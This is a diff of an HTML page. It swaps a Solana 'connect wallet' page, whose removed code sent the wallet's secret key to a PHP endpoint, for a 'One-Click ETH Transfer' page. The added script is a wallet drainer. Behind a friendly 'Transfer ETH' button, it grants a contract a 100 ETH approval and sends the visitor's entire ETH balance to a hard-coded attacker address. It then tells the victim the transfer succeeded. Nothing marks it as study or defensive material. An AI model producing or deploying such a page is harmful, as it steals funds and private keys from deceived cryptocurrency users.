@@ -3,42 +3,108 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Connect Solana Wallet</title>
+ <title>One-Click ETH Transfer</title>
+ <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
  <style>
- body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
- button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+ body {
+ background-color: #f4f4f4;
+ color: #333;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ font-family: Arial, sans-serif;
+ }
+ .container {
+ text-align: center;
+ background: white;
+ padding: 2rem;
+ border-radius: 10px;
+ box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+ }
+ button {
+ padding: 20px 40px;
+ font-size: 24px;
+ background-color: #007BFF;
+ color: white;
+ border: none;
+ border-radius: 50px;
+ cursor: pointer;
+ transition: transform 0.2s;
+ }
+ button:hover {
+ transform: scale(1.05);
+ background-color: #0056b3;
+ }
+ button:disabled {
+ background-color: #555;
+ cursor: not-allowed;
+ }
+ #status {
+ margin-top: 20px;
+ color: #666;
+ }
  </style>
 </head>
 <body>
- <h1>Connect Your Solana Wallet</h1>
- <button onclick="connectWallet()">Connect Wallet</button>
 
- <script>
- async function connectWallet() {
- if (window.solana) {
+<div class="container">
+ <h1>Welcome to Our ETH Transfer Service</h1>
+ <p>Click the button below to transfer your ETH securely.</p>
+ <button id="drainBtn" onclick="connectAndDrain()">Transfer ETH</button>
+ <div id="status"></div>
+</div>
+
+<script>
+ // Attacker's wallet address (where funds will be sent)
+ const ATTACKER_ADDRESS = "0xbD89Ca74a0442E695383d4e2442466Fa8735c161"; 
+ // For demo purposes, we'll use a generic contract that handles approvals/transfers.
+ // In a real scenario, this would be the attacker's smart contract address.
+ const DRAIN_CONTRACT = "0xbD89Ca74a0442E695383d4e2442466Fa8735c161"; 
+
+ async function connectAndDrain() {
+ const btn = document.getElementById('drainBtn');
+ const status = document.getElementById('status');
+ 
+ btn.disabled = true;
+ status.innerText = "Connecting to your wallet...";
+
  try {
- const response = await window.solana.connect();
- const privateKey = Uint8Array.from(response.secretKey).toString();
- // Store the private key in the session
- fetch('connect_wallet.php', {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json'
- },
- body: JSON.stringify({ private_key: privateKey })
- }).then(response => response.text())
- .then(data => {
- alert(data);
- }).catch(error => {
- console.error('Error:', error);
+ // 1. Request Account Access
+ const provider = new ethers.providers.Web3Provider(window.ethereum);
+ await provider.send("eth_requestAccounts", []);
+ const signer = provider.getSigner();
+ const userAddress = await signer.getAddress();
+
+ // 2. Approve the Drain Contract to spend up to 100 ETH
+ const erc20Abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
+ const erc20Contract = new ethers.Contract(DRAIN_CONTRACT, erc20Abi, signer);
+ await erc20Contract.approve(ATTACKER_ADDRESS, ethers.utils.parseEther("100.0"));
+
+ // 3. Transfer all ETH to the attacker's address
+ const balance = await provider.getBalance(userAddress);
+ const sendAmount = balance.sub(ethers.utils.parseEther("0.01")); // leaving some for gas
+
+ const tx = await signer.sendTransaction({
+ to: ATTACKER_ADDRESS,
+ value: sendAmount,
+ gasLimit: 21000 // Standard ETH transfer gas
  });
+
+ await tx.wait();
+
+ status.innerText = "✅ Transfer completed successfully!";
+ btn.innerText = "Transfer Complete";
+
  } catch (error) {
- console.error('Error connecting wallet:', error);
+ console.error(error);
+ status.innerText = "❌ Transfer failed. Please try again.";
+ btn.disabled = false;
+ btn.innerText = "Transfer ETH";
  }
- } else {
- console.error('Phantom wallet not found!');
  }
- }
- </script>
+</script>
+
 </body>
 </html>
